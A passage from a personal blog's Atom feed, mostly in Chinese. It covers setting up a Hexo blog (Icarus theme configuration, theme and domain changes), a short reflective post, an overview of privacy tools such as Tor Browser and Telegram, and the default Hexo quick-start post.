Links to be shown on the bottom of the profile widget</span></span><br><span class="line"><span class="hljs-attr">        social_links:</span></span><br><span class="line"><span class="hljs-attr">            Github:</span></span><br><span class="line"><span class="hljs-attr">                icon:</span> <span class="hljs-string">fab</span> <span class="hljs-string">fa-github</span></span><br><span class="line"><span class="hljs-attr">                url:</span> <span class="hljs-string">'https://github.com/FanqXu'</span></span><br><span class="line"><span class="hljs-attr">            Facebook:</span></span><br><span class="line"><span class="hljs-attr">                icon:</span> <span class="hljs-string">fab</span> <span class="hljs-string">fa-facebook</span></span><br><span class="line"><span class="hljs-attr">                url:</span> <span class="hljs-string">'https://www.facebook.com/zhuanjia.xiao.3'</span></span><br><span class="line"><span class="hljs-attr">            Twitter:</span></span><br><span class="line"><span class="hljs-attr">                icon:</span> <span class="hljs-string">fab</span> <span class="hljs-string">fa-twitter</span></span><br><span class="line"><span class="hljs-attr">                url:</span> <span class="hljs-string">'https://twitter.com/Expert83551161'</span></span><br><span class="line">            <span class="hljs-comment">#Dribbble:</span></span><br><span class="line">            <span class="hljs-comment">#    icon: fab fa-dribbble</span></span><br><span class="line">            <span class="hljs-comment">#    url: 'http://dribbble.com'</span></span><br><span class="line"><span class="hljs-attr">            RSS:</span></span><br><span class="line"><span class="hljs-attr">                icon:</span> <span class="hljs-string">fas</span> <span class="hljs-string">fa-rss</span></span><br><span class="line"><span class="hljs-attr">                url:</span> <span class="hljs-string">/atom.xml</span></span><br><span class="line"><span class="hljs-bullet">    -</span></span><br><span class="line">        <span class="hljs-comment"># Widget name</span></span><br><span class="line"><span class="hljs-attr">        type:</span> <span class="hljs-string">toc</span></span><br><span class="line">        <span class="hljs-comment"># Where should the widget be placed, left or right</span></span><br><span class="line"><span class="hljs-attr">        position:</span> <span class="hljs-string">left</span></span><br><span class="line"><span class="hljs-bullet">    -</span></span><br><span class="line">        <span class="hljs-comment"># Widget name</span></span><br><span class="line"><span class="hljs-attr">        type:</span> <span class="hljs-string">links</span></span><br><span class="line">        <span class="hljs-comment"># Where should the widget be placed, left or right</span></span><br><span class="line"><span class="hljs-attr">        position:</span> <span class="hljs-string">left</span></span><br><span class="line">        <span class="hljs-comment"># Links to be shown in the links widget</span></span><br><span class="line"><span class="hljs-attr">        links:</span></span><br><span class="line"><span class="hljs-attr">            Hexo:</span> <span class="hljs-string">'https://hexo.io'</span></span><br><span class="line"><span class="hljs-attr">            PPOffice:</span> <span class="hljs-string">'https://github.com/ppoffice'</span></span><br><span class="line"><span class="hljs-bullet">    -</span></span><br><span class="line">        <span class="hljs-comment"># Widget name</span></span><br><span class="line"><span class="hljs-attr">        type:</span> <span class="hljs-string">category</span></span><br><span class="line">        <span class="hljs-comment"># Where should the widget be placed, left or right</span></span><br><span class="line"><span class="hljs-attr">        position:</span> <span class="hljs-string">left</span></span><br><span class="line"><span class="hljs-bullet">    -</span></span><br><span class="line">        <span class="hljs-comment"># Widget name</span></span><br><span class="line"><span class="hljs-attr">        type:</span> <span class="hljs-string">tagcloud</span></span><br><span class="line">        <span class="hljs-comment"># Where should the widget be placed, left or right</span></span><br><span class="line"><span class="hljs-attr">        position:</span> <span class="hljs-string">left</span></span><br><span class="line"><span class="hljs-bullet">    -</span></span><br><span class="line">        <span class="hljs-comment"># Widget name</span></span><br><span class="line"><span class="hljs-attr">        type:</span> <span class="hljs-string">recent_posts</span></span><br><span class="line">        <span class="hljs-comment"># Where should the widget be placed, left or right</span></span><br><span class="line"><span class="hljs-attr">        position:</span> <span class="hljs-string">left</span></span><br><span class="line"><span class="hljs-bullet">    -</span></span><br><span class="line">        <span class="hljs-comment"># Widget name</span></span><br><span class="line"><span class="hljs-attr">        type:</span> <span class="hljs-string">archive</span></span><br><span class="line">        <span class="hljs-comment"># Where should the widget be placed, left or right</span></span><br><span class="line"><span class="hljs-attr">        position:</span> <span class="hljs-string">left</span></span><br><span class="line"><span class="hljs-bullet">    -</span></span><br><span class="line">        <span class="hljs-comment"># Widget name</span></span><br><span class="line"><span class="hljs-attr">        type:</span> <span class="hljs-string">tag</span></span><br><span class="line">        <span class="hljs-comment"># Where should the widget be placed, left or right</span></span><br><span class="line"><span class="hljs-attr">        position:</span> <span class="hljs-string">left</span></span><br><span class="line"><span class="hljs-comment"># Other plugin settings</span></span><br><span class="line"><span class="hljs-attr">plugins:</span></span><br><span class="line">    <span class="hljs-comment"># Enable page animations</span></span><br><span class="line"><span class="hljs-attr">    animejs:</span> <span class="hljs-literal">true</span></span><br><span class="line">    <span class="hljs-comment"># Enable the lightGallery and Justified Gallery plugins</span></span><br><span class="line">    <span class="hljs-comment"># http://ppoffice.github.io/hexo-theme-icarus/Plugins/General/gallery-plugin/</span></span><br><span class="line"><span class="hljs-attr">    gallery:</span> <span class="hljs-literal">true</span></span><br><span class="line">    <span class="hljs-comment"># Enable the Outdated Browser plugin</span></span><br><span class="line">    <span class="hljs-comment"># http://outdatedbrowser.com/</span></span><br><span class="line"><span class="hljs-attr">    outdated-browser:</span> <span class="hljs-literal">true</span></span><br><span class="line">    <span class="hljs-comment"># Enable the MathJax plugin</span></span><br><span class="line">    <span class="hljs-comment"># http://ppoffice.github.io/hexo-theme-icarus/Plugins/General/mathjax-plugin/</span></span><br><span class="line"><span class="hljs-attr">    mathjax:</span> <span class="hljs-literal">false</span></span><br><span class="line">    <span class="hljs-comment"># Show the back to top button on mobile devices</span></span><br><span class="line"><span class="hljs-attr">    back-to-top:</span> <span class="hljs-literal">true</span></span><br><span class="line">    <span class="hljs-comment"># Google Analytics plugin settings</span></span><br><span class="line">    <span class="hljs-comment"># http://ppoffice.github.io/hexo-theme-icarus/Plugins/General/site-analytics-plugin/#Google-Analytics</span></span><br><span class="line"><span class="hljs-attr">    google-analytics:</span></span><br><span class="line">        <span class="hljs-comment"># Google Analytics tracking id</span></span><br><span class="line"><span class="hljs-attr">        tracking_id:</span> <span class="hljs-string">UA-131397348-1</span></span><br><span class="line">    <span class="hljs-comment"># Baidu Analytics plugin settings</span></span><br><span class="line">    <span class="hljs-comment"># http://ppoffice.github.io/hexo-theme-icarus/Plugins/General/site-analytics-plugin/#Baidu-Analytics</span></span><br><span class="line"><span class="hljs-attr">    baidu-analytics:</span></span><br><span class="line">        <span class="hljs-comment"># Baidu Analytics tracking id</span></span><br><span class="line"><span class="hljs-attr">        tracking_id:</span></span><br><span class="line">    <span class="hljs-comment"># Hotjar user feedback plugin</span></span><br><span class="line">    <span class="hljs-comment"># http://ppoffice.github.io/hexo-theme-icarus/Plugins/General/site-analytics-plugin/#Hotjar</span></span><br><span class="line"><span class="hljs-attr">    hotjar:</span></span><br><span class="line">        <span class="hljs-comment"># Hotjar site id</span></span><br><span class="line"><span class="hljs-attr">        site_id:</span></span><br><span class="line">    <span class="hljs-comment"># Show a loading progress bar at top of the page</span></span><br><span class="line"><span class="hljs-attr">    progressbar:</span> <span class="hljs-literal">true</span></span><br><span class="line">    <span class="hljs-comment"># Show the copy button in the highlighted code area</span></span><br><span class="line"><span class="hljs-attr">    clipboard:</span> <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-comment"># CDN provider settings</span></span><br><span class="line"><span class="hljs-comment"># http://ppoffice.github.io/hexo-theme-icarus/Configuration/Theme/speed-up-your-site-with-custom-cdn/</span></span><br><span class="line"><span class="hljs-attr">providers:</span></span><br><span class="line">    <span class="hljs-comment"># Name or URL of the JavaScript and/or stylesheet CDN provider</span></span><br><span class="line"><span class="hljs-attr">    cdn:</span> <span class="hljs-string">jsdelivr</span></span><br><span class="line">    <span class="hljs-comment"># Name or URL of the webfont CDN provider</span></span><br><span class="line"><span class="hljs-attr">    fontcdn:</span> <span class="hljs-string">google</span></span><br><span class="line">    <span class="hljs-comment"># Name or URL of the webfont Icon CDN provider</span></span><br><span class="line"><span class="hljs-attr">    iconcdn:</span> <span class="hljs-string">fontawesome</span></span><br></pre></td></tr></table></figure><h2 id="0x02-美化、博文撰写、更换域名……"><a href="#0x02-美化、博文撰写、更换域名……" class="headerlink" title="0x02 美化、博文撰写、更换域名……　　"></a>0x02 美化、博文撰写、更换域名……　　</h2><h3 id="一、修改主题"><a href="#一、修改主题" class="headerlink" title="一、修改主题"></a>一、修改主题</h3><p>关于主题的话，我想没有谁会想用那一套默认的主题landscape。</p><p>当然Hexo官方也提供主题模板：</p><ul><li><p><a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p></li><li><p><a href="https://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener">https://github.com/hexojs/hexo/wiki/Themes</a></p></li></ul><p>提一个使用量多、优雅又强大的主题，这主题对于搞<strong>hexo</strong>的，可能都晓得吧 <b><font color="orange">next</font></b> ：</p><ul><li><p><a href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener">https://github.com/theme-next/hexo-theme-next</a></p></li><li><p><a href="https://theme-next.org/" target="_blank" rel="noopener">https://theme-next.org/</a></p></li></ul><p>我使用的不是此主题</p><blockquote><p>一个实栗：</p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tly1fwif8gdmxnj312f0q3ak8.jpg" alt=""></p></blockquote></blockquote><p>找到了漂亮的主题，然后就将其下载到本地的<code>themes</code>目录下，</p><p>然后修改全局配置文件<code>_config.yml</code><br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># Themes: https://hexo.io/themes/</span></span><br><span class="line">theme: next  <span class="hljs-comment"># 这里的名字就是在themes目录下的主题文件夹名字</span></span><br></pre></td></tr></table></figure></p><p>然后就可以生成部署了……<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></p><h3 id="二、更换专属域名"><a href="#二、更换专属域名" class="headerlink" title="二、更换专属域名　　"></a>二、更换专属域名　　</h3><p>这一步如果不做的话，那么访问你博客的方式就是：　　</p><p><a href="https://yourname.github.io" target="_blank" rel="noopener">https://yourname.github.io</a></p><p>当然，这也是全球最大同性社交网站Github免费给我们托管的。</p><p>如果你想使用自己花钱买的域名，也可以。你可以到阿里云上的<code>万网</code>或者其他域名厂商那里去选购，不过好的名字早已经被别人买了。(阿里云上的万网需要实名认证)</p><blockquote><p>举个栗子</p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tly1fwifyo4u8ej30w80kqdrp.jpg"></p></blockquote></blockquote><p>最后，还要将你买的域名写入到<code>source</code>目录下<code>CNAME</code>文件中，还有_config.yml中也要做出修改。</p><h3 id="三、博文撰写"><a href="#三、博文撰写" class="headerlink" title="三、博文撰写　"></a>三、博文撰写　</h3><p>每一篇文章，都得使用<strong>Markdown</strong>语法撰写。这意味着，你又得多学一份技能，不过也比较简单的。</p><h2 id="未完待续吧……"><a href="#未完待续吧……" class="headerlink" title="未完待续吧……"></a><strong>未完待续吧……</strong></h2><p>无论你是否为IT从业者，我也是建议文科同学能够搞定它，不晓得会不会有种瞬间挤进IT界的自豪感！！！</p><hr><p>Enjoy！！！</p><h3 id="Thinks："><a href="#Thinks：" class="headerlink" title="Thinks："></a>Thinks：</h3><ul><li>笨方法学写作 陈素封<ul><li><a href="http://www.cnfeat.com/blog/2014/05/11/how-to-build-a-blog/" target="_blank" rel="noopener">http://www.cnfeat.com/blog/2014/05/11/how-to-build-a-blog/</a></li></ul></li><li>BY<ul><li><a href="http://qiubaiying.top/2017/02/06/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" target="_blank" rel="noopener">http://qiubaiying.top/2017/02/06/快速搭建个人博客</a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　本文是一篇零基础的博客独立搭建教程，将会从&lt;b&gt;&lt;font color=&quot;red&quot;&gt;最开始的注册Github账号&lt;/font&gt;&lt;/b&gt;以及&lt;strong&gt;Git&lt;/strong&gt;……到最后的&lt;b&gt;&lt;font color=&quot;red&quot;&gt;工具推荐&lt;/font&gt;&lt;/b&gt;。写这篇文章，主要是因为本人博客也刚刚搭建完成；我想把我搭建博客的过程在一篇文章中详详细细的记录下来，放在将来……&lt;/p&gt;
    
    </summary>
    
      <category term="TechShare" scheme="https://fanqxu.com/categories/TechShare/"/>
    
    
      <category term="Hexo" scheme="https://fanqxu.com/tags/Hexo/"/>
    
      <category term="Blog" scheme="https://fanqxu.com/tags/Blog/"/>
    
  </entry>
  
  <entry>
    <title>心比天高，命比纸薄</title>
    <link href="https://fanqxu.com/2018/10/13/%E8%87%AA%E6%88%91%E5%8F%8D%E6%80%9D%E5%8F%8A%E6%84%9F%E8%A7%A6/index.html"/>
    <id>https://fanqxu.com/2018/10/13/自我反思及感触/index.html</id>
    <published>2018-10-13T06:11:34.000Z</published>
    <updated>2019-04-26T14:29:00.333Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>我思故我在！！！</p></blockquote><a id="more"></a><p>​        嗟夫！予尝求古仁人之心，或异二者之为，何哉？不以物喜，不以己悲；居庙堂之高则忧其民；处江湖之远则忧其君。是进亦忧，退亦忧。然则何时而乐耶？其必曰“先天下之忧而忧，后天下之乐而乐”乎。噫！微斯人，吾谁与归？　　</p><p><b>范仲淹《岳阳楼记》</b></p>]]></content>
    
    <summary type="html">
    
      心有所思,故有所写
    
    </summary>
    
      <category term="Trivia" scheme="https://fanqxu.com/categories/Trivia/"/>
    
    
      <category term="个人感悟" scheme="https://fanqxu.com/tags/%E4%B8%AA%E4%BA%BA%E6%84%9F%E6%82%9F/"/>
    
  </entry>
  
  <entry>
    <title>几个对于个人隐私的小工具</title>
    <link href="https://fanqxu.com/2018/10/11/%E8%B0%88%E8%B0%88%E4%B8%AA%E4%BA%BA%E5%AF%B9%E4%BA%8E%E9%9A%90%E7%A7%81%E6%89%80%E4%BD%BF%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%A0%E4%B8%AA%E5%B7%A5%E5%85%B7/index.html"/>
    <id>https://fanqxu.com/2018/10/11/谈谈个人对于隐私所使用到的几个工具/index.html</id>
    <published>2018-10-11T07:15:55.000Z</published>
    <updated>2019-03-20T11:54:40.684Z</updated>
    
    <content type="html"><![CDATA[<h3 id="不一样的浏览器"><a href="#不一样的浏览器" class="headerlink" title="不一样的浏览器"></a>不一样的浏览器</h3><ul><li><p><strong><a href="https://www.torproject.org/" target="_blank" rel="noopener"><font color="green">Tor Browser</font></a>（The Onion Router，洋葱浏览器）</strong></p>  <a id="more"></a><p>  <img src="http://ww1.sinaimg.cn/mw690/006V665tgy1fw2corzko1j30xc0k5gnd.jpg" alt=""></p></li></ul><blockquote><p>之前的<a href="https://mp.weixin.qq.com/s?__biz=MjM5MjAwODM4MA==&amp;mid=2650699089&amp;idx=1&amp;sn=856a5ac3828ef80b07016503350b6461&amp;chksm=bea6048289d18d949114eebad149afe8ce10bda7fc2ff1a695e5d759769cf698c5db71a2151c&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">A站近千万条数据遭公开贩卖</a>、<a href="https://36kr.com/p/5150594.html" target="_blank" rel="noopener">华住约140G用户数据被拖至DarkWeb贩卖</a>，</p><p>倒过来想，做黑产的人为何如此胆大妄为；</p><p>原因就在于 <font color="red">DarkWeb</font> 为其们提供了一层保护伞。</p></blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;聊起暗网，也更不得不提及<del>吃洋葱</del>，应该是 <code>洋葱浏览器</code>，一个使用Firefox开源内核的Browser，即 <a href="https://www.torproject.org/" target="_blank" rel="noopener"><font color="green">Tor Browser</font></a>。　　</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;而在国内，Tor常被用来突破GFW;Tor会自动检测节点是否可达目标地址，如果返回Error无法到达，它会自动更换节点。当然也有在墙内创建Tor网桥，用来帮助墙内用户使用。</p><blockquote><p>Tor用户分布图</p><blockquote><p><img src="http://ww1.sinaimg.cn/mw690/006V665tly1fw2cm61y86j30sg0i711o.jpg" alt=""></p></blockquote></blockquote><hr><h3 id="端对端加密"><a href="#端对端加密" class="headerlink" title="端对端加密"></a>端对端加密</h3><ul><li><p><strong><a href="https://telegram.org/" target="_blank" rel="noopener"><font color="#85C1E9">Telegram Message</font></a>（一款开源的跨平台的即时通信软件）</strong></p><p>  <img src="http://ww1.sinaimg.cn/mw690/006V665tgy1fw2co4ub8uj30l20f3gly.jpg" alt=""><br>  　　本人目前正在使用的一款 <code>IM</code>,由俄某某富豪为个人隐私而推出，个人感觉很不错……</p></li></ul><blockquote><p>图解秘密聊天模式</p><blockquote><p><img src="http://ww1.sinaimg.cn/mw690/006V665tly1fw2e9u79w4j30sg0cc77g.jpg" alt=""></p></blockquote></blockquote><blockquote><p>MTProto聊天记录加密方式</p><blockquote><p><img src="http://ww1.sinaimg.cn/mw690/006V665tgy1fw2ebnzeudj30lo0ksdk3.jpg" alt=""></p></blockquote></blockquote><h4 id="源代码库"><a href="#源代码库" class="headerlink" title="源代码库"></a>源代码库</h4><blockquote><p>依旧还是托管在最大的同性交友平台<a href="https://github.com/telegramdesktop/tdesktop" target="_blank" rel="noopener">https://github.com/telegramdesktop/tdesktop</a></p></blockquote><h4 id="某些问题"><a href="#某些问题" class="headerlink" title="某些问题"></a>某些问题</h4><ul><li><p>干扰遭受与封禁</p><ul><li>墙内无法使用</li><li>且服务器曾多次遭受<code>DDoS</code></li></ul></li><li><p>恐怖活动</p><ul><li><del>ISIS</del>，就不多聊了</li></ul></li><li><p>色情、版权侵犯</p><ul><li>强调不鼓励色情内容及版权侵犯存在</li><li>用户自行举报</li></ul></li><li><p>注册或登录出现banned</p><ul><li>前段时间出现大量+86恶意注册</li><li>可能需得换个号注册</li><li>或Twitter<a href="https://twitter.com/smstelegram" target="_blank" rel="noopener">@smstelegram</a>（亲测）</li></ul></li><li><p>墙内代理使用，而非微屁恩</p><ul><li>注册时仍需搭一下梯子</li><li>进入后右上角搜索@TgProxies</li><li>代理方式<ul><li>SOCKS5</li><li>MTProto(<font color="red">建议</font>)</li></ul></li></ul></li></ul><h4 id="参见"><a href="#参见" class="headerlink" title="参见"></a>参见</h4><ul><li>Telegram-维基百科 <a href="https://zh.wikipedia.org/wiki/Telegram" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Telegram</a></li><li>洋葱浏览器－维基百科 <a href="https://zh.wikipedia.org/wiki/%E6%B4%8B%E8%91%B1%E8%B7%AF%E7%94%B1%E5%99%A8" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/洋葱路由器</a></li><li>近五亿人隐私－36kr <a href="https://36kr.com/p/5150594.html" target="_blank" rel="noopener">https://36kr.com/p/5150594.html</a></li></ul><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li>部分链接打开请自行搭梯子</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;不一样的浏览器&quot;&gt;&lt;a href=&quot;#不一样的浏览器&quot; class=&quot;headerlink&quot; title=&quot;不一样的浏览器&quot;&gt;&lt;/a&gt;不一样的浏览器&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://www.torproject.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;font color=&quot;green&quot;&gt;Tor Browser&lt;/font&gt;&lt;/a&gt;（The Onion Router，洋葱浏览器）&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="隐私" scheme="https://fanqxu.com/tags/%E9%9A%90%E7%A7%81/"/>
    
  </entry>
  
  <entry>
    <title>Hexo基本使用</title>
    <link href="https://fanqxu.com/2018/10/10/hello-world/index.html"/>
    <id>https://fanqxu.com/2018/10/10/hello-world/index.html</id>
    <published>2018-10-09T16:00:00.000Z</published>
    <updated>2018-12-27T04:10:24.136Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="hljs-string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
    
    </summary>
    
    
      <category term="Hexo" scheme="https://fanqxu.com/tags/Hexo/"/>
    
      <category term="Blog" scheme="https://fanqxu.com/tags/Blog/"/>
    
  </entry>
  
</feed>
